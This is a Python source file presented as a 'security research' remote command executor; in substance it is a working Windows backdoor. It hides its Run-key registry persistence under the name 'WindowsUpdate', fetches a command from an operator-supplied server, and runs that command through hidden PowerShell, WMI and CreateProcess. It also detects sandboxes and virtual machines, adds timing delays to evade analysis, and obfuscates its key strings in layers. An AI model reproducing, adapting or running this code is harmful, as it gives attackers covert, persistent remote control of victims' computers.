#!/usr/bin/env python3
"""
Hansen TCAP - Remote Command Executor
Security Research Tool

This module provides remote command execution capabilities for authorized
security testing and research purposes only.
"""

# Import the actual implementation from the original file
# This allows the package to work while maintaining backward compatibility
import urllib.request
import json
import subprocess
import sys
import os
import base64
import time
import platform
import random
import ctypes
from ctypes import wintypes
from enum import IntEnum, Enum
from typing import Optional, List, Tuple

_BUILD_CONFIG = {
    "prefix_offset": 0x41,
    "suffix_offset": 0x5A,
    "xor_key": 0x42,
    "split_count": 3,
    "encoding_version": 2,
}


class TransformEncoder:
    def __init__(self, encoded_data: bytes, transform_type: str = "base64"):
        self._encoded_data = encoded_data
        self._transform_type = transform_type
        self._decoded: Optional[str] = None

    @classmethod
    def encode(cls, plaintext: str, transform_type: str = "base64"):
        if transform_type == "base64":
            encoded = base64.b64encode(plaintext.encode("utf-8"))
        elif transform_type == "xor":
            key = _BUILD_CONFIG["xor_key"]
            encoded = bytes(b ^ key for b in plaintext.encode("utf-8"))
        else:
            raise ValueError(f"Unknown transform type: {transform_type}")
        return cls(encoded, transform_type)

    def decode(self) -> str:
        if self._decoded is not None:
            return self._decoded

        if self._transform_type == "base64":
            self._decoded = base64.b64decode(self._encoded_data).decode("utf-8")
        elif self._transform_type == "xor":
            key = _BUILD_CONFIG["xor_key"]
            self._decoded = bytes(b ^ key for b in self._encoded_data).decode("utf-8")
        else:
            raise ValueError(f"Unknown transform type: {self._transform_type}")

        return self._decoded


class SplitReassembleEncoder:
    def __init__(self, fragments: List[str]):
        self._fragments = fragments

    @classmethod
    def encode(cls, plaintext: str, num_splits: int = None):
        if num_splits is None:
            num_splits = _BUILD_CONFIG["split_count"]

        fragment_size = len(plaintext) // num_splits
        fragments = []
        start = 0

        for i in range(num_splits - 1):
            end = start + fragment_size
            fragments.append(plaintext[start:end])
            start = end

        fragments.append(plaintext[start:])
        return cls(fragments)

    def decode(self) -> str:
        return "".join(self._fragments)


class DerivedStringEncoder:
    def __init__(self, derivation_method: str, params: Tuple):
        self._derivation_method = derivation_method
        self._params = params
        self._cached: Optional[str] = None

    @classmethod
    def from_lookup_table(cls, indices: List[int], table: List[int]):
        return cls("lookup_table", (indices, table))

    def decode(self) -> str:
        if self._cached is not None:
            return self._cached

        if self._derivation_method == "lookup_table":
            indices, table = self._params
            chars = [chr(table[i]) for i in indices]
            self._cached = "".join(chars)
        else:
            raise ValueError(f"Unknown derivation method: {self._derivation_method}")

        return self._cached


class LazyDecoder:
    def __init__(self, encoded_data: bytes, decoder_func):
        self._encoded_data = encoded_data
        self._decoder_func = decoder_func
        self._decoded: Optional[str] = None

    @property
    def value(self) -> str:
        if self._decoded is None:
            self._decoded = self._decoder_func(self._encoded_data)
        return self._decoded


class MultiRepresentationEncoder:
    def __init__(self, representations: dict):
        self._representations = representations
        self._selected: Optional[str] = None

    @classmethod
    def encode(cls, plaintext: str):
        representations = {
            "base64": base64.b64encode(plaintext.encode("utf-8")).decode("ascii"),
            "hex": plaintext.encode("utf-8").hex(),
            "xor": "".join(chr(ord(c) ^ _BUILD_CONFIG["xor_key"]) for c in plaintext),
        }
        return cls(representations)

    def decode(self, representation: Optional[str] = None) -> str:
        if representation is None:
            representation = random.choice(list(self._representations.keys()))
        self._selected = representation

        encoded = self._representations[representation]

        if representation == "base64":
            return base64.b64decode(encoded.encode("ascii")).decode("utf-8")
        elif representation == "hex":
            return bytes.fromhex(encoded).decode("utf-8")
        elif representation == "xor":
            key = _BUILD_CONFIG["xor_key"]
            return "".join(chr(ord(c) ^ key) for c in encoded)
        else:
            raise ValueError(f"Unknown representation: {representation}")


class ControlFlowEncoder:
    def __init__(self, construction_logic: str, params: dict):
        self._construction_logic = construction_logic
        self._params = params
        self._cached: Optional[str] = None

    @classmethod
    def encode(cls, plaintext: str, branch_count: int = 3):
        return cls("branching", {"plaintext": plaintext, "branch_count": branch_count})

    def decode(self, branch_selector: Optional[int] = None) -> str:
        if self._cached is not None:
            return self._cached

        if self._construction_logic == "branching":
            plaintext = self._params["plaintext"]
            branch_count = self._params["branch_count"]

            if branch_selector is None:
                branch_selector = random.randint(0, branch_count - 1)

            result = ""
            for i, char in enumerate(plaintext):
                branch = (i + branch_selector) % branch_count

                if branch == 0:
                    result += char
                elif branch == 1:
                    result += chr(ord(char) ^ 0)
                elif branch == 2:
                    temp = ord(char)
                    temp = temp | 0
                    result += chr(temp)
                else:
                    result += char

            self._cached = result
        else:
            raise ValueError(f"Unknown construction logic: {self._construction_logic}")

        return self._cached


class ExternalizedEncoder:
    def __init__(self, base_string: str, derivation_config: dict):
        self._base_string = base_string
        self._derivation_config = derivation_config
        self._cached: Optional[str] = None

    @classmethod
    def encode(cls, plaintext: str):
        return cls(plaintext, _BUILD_CONFIG.copy())

    def decode(self) -> str:
        if self._cached is not None:
            return self._cached

        prefix_char = chr(self._derivation_config["prefix_offset"])
        suffix_char = chr(self._derivation_config["suffix_offset"])

        self._cached = f"{prefix_char}{self._base_string}{suffix_char}"
        return self._cached


class WipeableString:
    def __init__(self, value: str):
        self._value = value
        self._wiped = False

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.wipe()
        return False

    def get(self) -> str:
        if self._wiped:
            raise ValueError("String has been wiped")
        return self._value

    def wipe(self):
        if not self._wiped:
            self._value = "\x00" * len(self._value)
            self._wiped = True

    def is_wiped(self) -> bool:
        return self._wiped


class DecoyStringManager:
    def __init__(self, real_string: str, decoy_strings: List[str]):
        self._real_string = real_string
        self._decoy_strings = decoy_strings
        self._all_strings = [real_string] + decoy_strings
        random.shuffle(self._all_strings)

    @classmethod
    def encode(cls, plaintext: str, num_decoys: int = 3):
        decoys = [
            "API_KEY_PLACEHOLDER",
            "SECRET_TOKEN_EXAMPLE",
            "DATABASE_PASSWORD_DEMO",
            "ENCRYPTION_KEY_SAMPLE",
            "AUTH_TOKEN_TEMPLATE",
        ][:num_decoys]
        return cls(plaintext, decoys)

    def get_real(self) -> str:
        return self._real_string


_OBFUSCATED_STRINGS = {
    "registry_run_key": SplitReassembleEncoder.encode(
        r"Software\Microsoft\Windows\CurrentVersion\Run"
    ),
    "registry_value_name": MultiRepresentationEncoder.encode("WindowsUpdate"),
    "user_agent": TransformEncoder.encode("RemoteCmdExec/1.0", "base64"),
    "connection": ControlFlowEncoder.encode("close"),
    "powershell": DerivedStringEncoder.from_lookup_table(
        list(range(10)), [112, 111, 119, 101, 114, 115, 104, 101, 108, 108]
    ),
    "powershell_window_style": ExternalizedEncoder.encode("-WindowStyle"),
    "powershell_hidden": LazyDecoder(
        base64.b64encode("Hidden".encode("utf-8")),
        lambda x: base64.b64decode(x).decode("utf-8"),
    ),
    "powershell_encoded_command": MultiRepresentationEncoder.encode("-EncodedCommand"),
    "wmi_command_template": SplitReassembleEncoder.encode('wmic process call create "{command}"'),
    "redirect_output": ControlFlowEncoder.encode(">nul 2>&1"),
    "utf8": TransformEncoder.encode("utf-8", "xor"),
    "utf16le": DerivedStringEncoder.from_lookup_table(
        list(range(8)), [117, 116, 102, 45, 49, 54, 108, 101]
    ),
    "json_command_key": MultiRepresentationEncoder.encode("command"),
    "tasklist": ControlFlowEncoder.encode("tasklist"),
}

_VM_PROCESSES_OBFUSCATED = [
    TransformEncoder.encode("vmtoolsd", "base64"),
    SplitReassembleEncoder.encode("vmwaretray"),
    MultiRepresentationEncoder.encode("vmwareuser"),
    ControlFlowEncoder.encode("vboxservice"),
    DerivedStringEncoder.from_lookup_table(
        list(range(8)), [118, 98, 111, 120, 116, 114, 97, 121]
    ),
]


def _get_string(key: str) -> str:
    if key not in _OBFUSCATED_STRINGS:
        raise ValueError(f"Unknown string key: {key}")

    encoder = _OBFUSCATED_STRINGS[key]
    if isinstance(encoder, TransformEncoder):
        return encoder.decode()
    elif isinstance(encoder, SplitReassembleEncoder):
        return encoder.decode()
    elif isinstance(encoder, DerivedStringEncoder):
        return encoder.decode()
    elif isinstance(encoder, LazyDecoder):
        return encoder.value
    elif isinstance(encoder, MultiRepresentationEncoder):
        return encoder.decode()
    elif isinstance(encoder, ControlFlowEncoder):
        return encoder.decode()
    elif isinstance(encoder, ExternalizedEncoder):
        result = encoder.decode()
        return result[1:-1]
    else:
        raise ValueError(f"Unknown encoder type: {type(encoder)}")


def _get_vm_processes() -> List[str]:
    result = []
    for encoder in _VM_PROCESSES_OBFUSCATED:
        if isinstance(encoder, TransformEncoder):
            result.append(encoder.decode())
        elif isinstance(encoder, SplitReassembleEncoder):
            result.append(encoder.decode())
        elif isinstance(encoder, MultiRepresentationEncoder):
            result.append(encoder.decode())
        elif isinstance(encoder, ControlFlowEncoder):
            result.append(encoder.decode())
        elif isinstance(encoder, DerivedStringEncoder):
            result.append(encoder.decode())
        elif isinstance(encoder, ExternalizedEncoder):
            decoded = encoder.decode()
            result.append(decoded[1:-1])
    return result


class Config:
    IS_WINDOWS = platform.system() == "Windows"

    class Timeout(IntEnum):
        SANDBOX_CHECK = 5
        HTTP_REQUEST = 10
        COMMAND_EXECUTION = 30
        PROCESS_WAIT = 30000

    class Threshold(IntEnum):
        UPTIME_MIN_MS = 60000
        CPU_MIN_COUNT = 2

    class Timing(Enum):
        BASE_DELAY_MIN = 1.0
        BASE_DELAY_MAX = 3.0
        JITTER_MIN = -0.2
        JITTER_MAX = 0.2
        MIN_DELAY = 0.1

    class WindowsAPI(IntEnum):
        CREATE_NO_WINDOW = 0x08000000
        CREATE_NEW_CONSOLE = 0x00000010
        SW_HIDE = 0
        STARTF_USESTDHANDLES = 0x00000100
        STARTF_USESHOWWINDOW = 0x00000001

    class Registry(IntEnum):
        HKEY_CURRENT_USER = 0x80000001
        KEY_READ = 0x20019
        KEY_WRITE = 0x20006
        REG_SZ = 1
        REG_OPTION_NON_VOLATILE = 0
        ERROR_SUCCESS = 0

    class RegistryPath:
        @staticmethod
        def RUN_KEY():
            return _get_string("registry_run_key")

        @staticmethod
        def VALUE_NAME():
            return _get_string("registry_value_name")

    class Sandbox:
        @staticmethod
        def VM_PROCESSES():
            return _get_vm_processes()

    class Network:
        @staticmethod
        def USER_AGENT():
            return _get_string("user_agent")

        @staticmethod
        def CONNECTION():
            return _get_string("connection")

    class Execution:
        @staticmethod
        def POWERSHELL():
            return _get_string("powershell")

        @staticmethod
        def POWERSHELL_WINDOW_STYLE():
            return _get_string("powershell_window_style")

        @staticmethod
        def POWERSHELL_HIDDEN():
            return _get_string("powershell_hidden")

        @staticmethod
        def POWERSHELL_ENCODED_COMMAND():
            return _get_string("powershell_encoded_command")

        @staticmethod
        def WMI_COMMAND(command: str):
            template = _get_string("wmi_command_template")
            return template.replace("{command}", command)

        @staticmethod
        def REDIRECT_OUTPUT():
            return _get_string("redirect_output")

    class Encoding:
        @staticmethod
        def UTF8():
            return _get_string("utf8")

        @staticmethod
        def UTF16LE():
            return _get_string("utf16le")

    class JSONKey:
        @staticmethod
        def COMMAND():
            return _get_string("json_command_key")


def obfuscate_command(command):
    encoded = base64.b64encode(command.encode(Config.Encoding.UTF8())).decode(
        Config.Encoding.UTF8()
    )
    return encoded


def deobfuscate_command(obfuscated):
    return base64.b64decode(obfuscated.encode(Config.Encoding.UTF8())).decode(
        Config.Encoding.UTF8()
    )


def is_sandbox_environment():
    if not Config.IS_WINDOWS:
        return False

    kernel32 = ctypes.windll.kernel32
    uptime_ms = kernel32.GetTickCount()
    if uptime_ms < Config.Threshold.UPTIME_MIN_MS:
        return True

    cpu_count = os.cpu_count()
    if cpu_count < Config.Threshold.CPU_MIN_COUNT:
        return True

    result = subprocess.run(
        [_get_string("tasklist")],
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.SANDBOX_CHECK,
    )
    if result.returncode == 0:
        output = result.stdout.decode(Config.Encoding.UTF8(), errors="ignore").lower()
        for vm_proc in Config.Sandbox.VM_PROCESSES():
            if vm_proc in output:
                return True

    return False


def timing_evasion():
    base_delay = random.uniform(
        Config.Timing.BASE_DELAY_MIN.value, Config.Timing.BASE_DELAY_MAX.value
    )
    jitter = (
        random.uniform(Config.Timing.JITTER_MIN.value, Config.Timing.JITTER_MAX.value) * base_delay
    )
    delay = max(Config.Timing.MIN_DELAY.value, base_delay + jitter)

    start = time.time()
    while time.time() - start < delay:
        pass


def execute_via_winapi(command):
    if not Config.IS_WINDOWS:
        return False

    kernel32 = ctypes.windll.kernel32

    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD),
            ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR),
            ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD),
            ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD),
            ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD),
            ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD),
            ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD),
            ("cbReserved2", wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
            ("hStdInput", wintypes.HANDLE),
            ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE),
            ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD),
            ("dwThreadId", wintypes.DWORD),
        ]

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    si.dwFlags = Config.WindowsAPI.STARTF_USESHOWWINDOW
    si.wShowWindow = Config.WindowsAPI.SW_HIDE

    pi = PROCESS_INFORMATION()

    CreateProcessA = kernel32.CreateProcessA
    CreateProcessA.argtypes = [
        wintypes.LPCSTR,
        wintypes.LPSTR,
        wintypes.LPVOID,
        wintypes.LPVOID,
        wintypes.BOOL,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.LPCSTR,
        ctypes.POINTER(STARTUPINFO),
        ctypes.POINTER(PROCESS_INFORMATION),
    ]
    CreateProcessA.restype = wintypes.BOOL

    cmd_line_buf = ctypes.create_string_buffer(command.encode("utf-8") + b"\x00")
    success = CreateProcessA(
        None,
        cmd_line_buf,
        None,
        None,
        False,
        Config.WindowsAPI.CREATE_NO_WINDOW,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi),
    )

    if not success:
        return False

    kernel32.WaitForSingleObject(pi.hProcess, Config.Timeout.PROCESS_WAIT)
    kernel32.CloseHandle(pi.hProcess)
    kernel32.CloseHandle(pi.hThread)
    return True


def execute_via_powershell(command):
    if not Config.IS_WINDOWS:
        return False

    encoded_cmd = base64.b64encode(command.encode(Config.Encoding.UTF16LE())).decode(
        Config.Encoding.UTF8()
    )
    ps_command = f"{Config.Execution.POWERSHELL()} {Config.Execution.POWERSHELL_WINDOW_STYLE()} {Config.Execution.POWERSHELL_HIDDEN()} {Config.Execution.POWERSHELL_ENCODED_COMMAND()} {encoded_cmd}"

    subprocess.run(
        ps_command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
    )
    return True


def execute_via_os_system(command):
    old_path = os.environ.get("PATH", "")
    os.environ["PATH"] = old_path

    os.system(f"{command} {Config.Execution.REDIRECT_OUTPUT()}")
    return True


def execute_via_wmi(command):
    if not Config.IS_WINDOWS:
        return False

    wmi_command = Config.Execution.WMI_COMMAND(command)
    subprocess.run(
        wmi_command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
    )
    return True


def execute_via_subprocess_hidden(command):
    if not Config.IS_WINDOWS:
        return False

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= Config.WindowsAPI.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = Config.WindowsAPI.SW_HIDE

    subprocess.run(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
        startupinfo=startupinfo,
        creationflags=Config.WindowsAPI.CREATE_NO_WINDOW,
    )
    return True


def get_executable_path():
    if hasattr(sys, "frozen") and hasattr(sys, "_MEIPASS"):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(sys.argv[0])

    args = " ".join(sys.argv[1:])
    if args:
        return f'"{exe_path}" {args}'
    return f'"{exe_path}"'


def is_persisted():
    if not Config.IS_WINDOWS:
        return False

    advapi32 = ctypes.windll.advapi32

    RegOpenKeyExW = advapi32.RegOpenKeyExW
    RegOpenKeyExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.REGSAM,
        ctypes.POINTER(wintypes.HKEY),
    ]
    RegOpenKeyExW.restype = wintypes.LONG

    RegQueryValueExW = advapi32.RegQueryValueExW
    RegQueryValueExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        ctypes.POINTER(wintypes.LPDWORD),
        ctypes.POINTER(wintypes.LPDWORD),
        ctypes.POINTER(wintypes.BYTE),
        ctypes.POINTER(wintypes.DWORD),
    ]
    RegQueryValueExW.restype = wintypes.LONG

    RegCloseKey = advapi32.RegCloseKey
    RegCloseKey.argtypes = [wintypes.HKEY]
    RegCloseKey.restype = wintypes.LONG

    h_key = wintypes.HKEY()
    result = RegOpenKeyExW(
        Config.Registry.HKEY_CURRENT_USER,
        Config.RegistryPath.RUN_KEY(),
        0,
        Config.Registry.KEY_READ,
        ctypes.byref(h_key),
    )

    if result != Config.Registry.ERROR_SUCCESS:
        return False

    dw_type = wintypes.DWORD()
    dw_size = wintypes.DWORD(0)

    value_name_wide = Config.RegistryPath.VALUE_NAME().encode(Config.Encoding.UTF16LE()) + b"\x00\x00"

    result = RegQueryValueExW(
        h_key, value_name_wide, None, ctypes.byref(dw_type), None, ctypes.byref(dw_size)
    )

    RegCloseKey(h_key)

    if (
        result == Config.Registry.ERROR_SUCCESS
        and dw_type.value == Config.Registry.REG_SZ
        and dw_size.value > 0
    ):
        return True

    return False


def install_persistence():
    if not Config.IS_WINDOWS:
        return

    advapi32 = ctypes.windll.advapi32

    RegCreateKeyExW = advapi32.RegCreateKeyExW
    RegCreateKeyExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.LPWSTR,
        wintypes.DWORD,
        wintypes.REGSAM,
        wintypes.LPVOID,
        ctypes.POINTER(wintypes.HKEY),
        ctypes.POINTER(wintypes.LPDWORD),
    ]
    RegCreateKeyExW.restype = wintypes.LONG

    RegSetValueExW = advapi32.RegSetValueExW
    RegSetValueExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.BYTE),
        wintypes.DWORD,
    ]
    RegSetValueExW.restype = wintypes.LONG

    RegCloseKey = advapi32.RegCloseKey
    RegCloseKey.argtypes = [wintypes.HKEY]
    RegCloseKey.restype = wintypes.LONG

    exe_path_with_args = get_executable_path()

    h_key = wintypes.HKEY()
    dw_disposition = wintypes.DWORD()

    result = RegCreateKeyExW(
        Config.Registry.HKEY_CURRENT_USER,
        Config.RegistryPath.RUN_KEY(),
        0,
        None,
        Config.Registry.REG_OPTION_NON_VOLATILE,
        Config.Registry.KEY_WRITE,
        None,
        ctypes.byref(h_key),
        ctypes.byref(dw_disposition),
    )

    if result != Config.Registry.ERROR_SUCCESS:
        return

    value_data = exe_path_with_args.encode(Config.Encoding.UTF16LE()) + b"\x00\x00"
    value_size = len(value_data)
    value_name_wide = Config.RegistryPath.VALUE_NAME().encode(Config.Encoding.UTF16LE()) + b"\x00\x00"

    value_buffer = ctypes.create_string_buffer(value_data)

    RegSetValueExW(
        h_key,
        value_name_wide,
        0,
        Config.Registry.REG_SZ,
        ctypes.cast(value_buffer, ctypes.POINTER(wintypes.BYTE)),
        value_size,
    )

    RegCloseKey(h_key)


def setup_persistence():
    if not Config.IS_WINDOWS:
        return

    if is_persisted():
        return

    install_persistence()


def fetch_command_from_server(server, port=80):
    url = f"http://{server}:{port}/"
    req = urllib.request.Request(url)
    req.add_header("User-Agent", Config.Network.USER_AGENT())
    req.add_header("Connection", Config.Network.CONNECTION())

    with urllib.request.urlopen(req, timeout=Config.Timeout.HTTP_REQUEST) as response:
        response_data = response.read().decode(Config.Encoding.UTF8())
        return json.loads(response_data)


def execute_command(command):
    if is_sandbox_environment():
        return

    timing_evasion()

    obfuscated = obfuscate_command(command)

    execution_methods = [
        execute_via_winapi,
        execute_via_powershell,
        execute_via_wmi,
        execute_via_subprocess_hidden,
        execute_via_os_system,
    ]

    for method in execution_methods:
        if method(command):
            return

    subprocess.run(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
    )


def main():
    setup_persistence()

    server = sys.argv[1]
    port = int(sys.argv[2])

    command_data = fetch_command_from_server(server, port)
    command = command_data[Config.JSONKey.COMMAND()]

    execute_command(command)


if __name__ == "__main__":
    main()

__version__ = "1.0.0"
__all__ = [
    "TransformEncoder",
    "SplitReassembleEncoder",
    "DerivedStringEncoder",
    "LazyDecoder",
    "MultiRepresentationEncoder",
    "ControlFlowEncoder",
    "ExternalizedEncoder",
    "WipeableString",
    "DecoyStringManager",
    "Config",
    "obfuscate_command",
    "deobfuscate_command",
    "is_sandbox_environment",
    "timing_evasion",
    "execute_via_winapi",
    "execute_via_powershell",
    "execute_via_wmi",
    "execute_via_os_system",
    "execute_via_subprocess_hidden",
    "execute_command",
    "get_executable_path",
    "is_persisted",
    "install_persistence",
    "setup_persistence",
    "fetch_command_from_server",
    "main",
]
